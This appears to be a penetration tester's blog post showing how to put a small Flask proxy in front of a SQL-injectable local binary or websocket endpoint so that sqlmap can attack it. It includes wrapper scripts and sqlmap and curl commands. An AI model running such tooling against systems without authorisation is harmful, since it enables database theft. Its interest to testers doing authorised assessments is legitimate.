---
layout: post
title: SQLMap ALL the Things!
date: 2023-06-05 14:34 -0400
categories: [Python]
tags: [hacking, sqlmap, sql injection, python, boilerplate]
---

SQLMap is a tremendous tool that we all should know in the infosec field. For those that don't, it is a Swiss Army Knife of SQL Injections. The basic idea is that generally speaking, SQL Injections can be time consuming, and if you need to deal with a blind SQL injection attack and rely on things like `SLEEP` commands, you'll need to script it. Thankfully SQLMap was created to handle exactly this, and it effectively works out so that if you find a SQL Injection point somewhere, you simply point SQLMap at it and it should suss out what's necessary to extract as much data as our user is entitled to viewing. 

SQLMap is, however, tuned to web apps. If there is a SQL Injection point, I think it's safe to say that a vast majority of the time it will be backended to some sort of web app. Meaning HTTP/HTTPS. But what about anything else? What about if you are pentesting a local app that isn't capable of responding via a web service? Or some sort of web-adjacent service like websockets? That certainly happens, and if there is a SQL Injection point there, how do you point SQLMap to it to begin its attack?

My solution: make a web app that translates requests to executing the vulnerable app.

This is my boilerplate code:

```python
#!/usr/bin/env python

from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=["POST"])
def sql_attack():
    data = request.form['id']

    # do stuff here with the `data` variable

    return result

if __name__ == "__main__":
    app.run(host="127.0.0.1")
```

## SQLMap against a Binary
The above is the wrapper code around whatever command that you need to execute that has an injection point. For example, let's say there is a binary named `/usr/bin/vuln` that gets executed like so:

```sh
/usr/bin/vuln username=agr0 password=letmein query='{"state": "xyz"}'
```

And it should return something like:

```json
{
    "resultState": "'xyz' is not found in our database!"
}
```

We know from testing that the `query` attribute is vulnerable, by including the value of `{"state": "xyz'"}` (note the additional single quote). It communicates through to the backend using some sort of proprietary communication protocol that we can't easily sniff using wireshark, or worse -- we don't have access to sniff that network!

I can use the above boilerplate code to wrap the invocation of the binary around an HTTP POST request:

{% raw %}
```python
#!/usr/bin/env python

from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/', methods=["POST"])
def sql_attack():
    data = request.form['id']

    # do stuff here with the `data` variable
    proc = subprocess.run(["/usr/bin/vuln", "username=agr0", "password=letmein",
                           f"query='{{\"state\": \"{data}\"}}'"], stdout=subprocess.PIPE,
                           universal_newlines=True)
    return proc.stdout

if __name__ == "__main__":
    app.run(host="127.0.0.1")
```
{% endraw %}
Note the use of the double curly-braces, this is to escape the literal curly braces and add the python format-string variable.

Now if I execute this code, I can test it with:

```sh
curl -XPOST -d "id=xyz" http://localhost:5000
```

This should return the exact same output as the above. Now we have it wrapped in the HTTP protocol so we can point sqlmap to it!

```sh
sqlmap -u http://localhost:5000 --data 'id=xyz' -p id
```

Now sqlmap should work as normal against the binary!

## SQLMap against Websockets

Using the same idea as above, I will tailor my attack towards a websocket now that we have tested for a potential SQL Injection Vulnerability. For this, I will use python's `websocket` libary to make the connection.

Let's say for example that an endpoint at `/cx` is vulnerable. The payload it expects is a json object, specifically `{"connectionID": "ABCD123"}`, and it is SQL Injectable via escaping quotes, where the connection dumps an error message and severs the websocket connection.

Using the above boilerplate, I'll tailor it a little bit to make a websocket connection. Python really can do everything.

```python
#!/usr/bin/env python3

from websocket import create_connection
import json
from flask import Flask, request

ws_host = "ws://10.20.30.40:5789"

app = Flask(__name__)

@app.route('/', methods=["POST"])
def webs_attack():
    data = request.form['id']
    ws = create_connection(ws_host + '/cx')
    d = {"connectionID": data}
    ws.send(json.dumps(d))
    print("Sending:", json.dumps(d))
    result = ws.recv()
    print("Received:", result)
    ws.close()
    return result

if __name__ == "__main__":
    app.run(host="127.0.0.1")
```

Now for every connection made to `http://localhost:5000/` via a POST request and sending `id=xyz` it will set up the websocket connection, build the JSON payload, send it, and cleanly sever the websocket. By doing this, I can now point SQLMap to this code and it will forward the request to the endpoint on the websocket and return the result.

## Conclusion
Hopefully you can see the versatility of using Flask to serve as a quick-and-dirty web frontend which can potentially expand upon the attack surface of a lot of tools. SQLMap is the first thing that comes to mind, but I wonder what else can be used like this?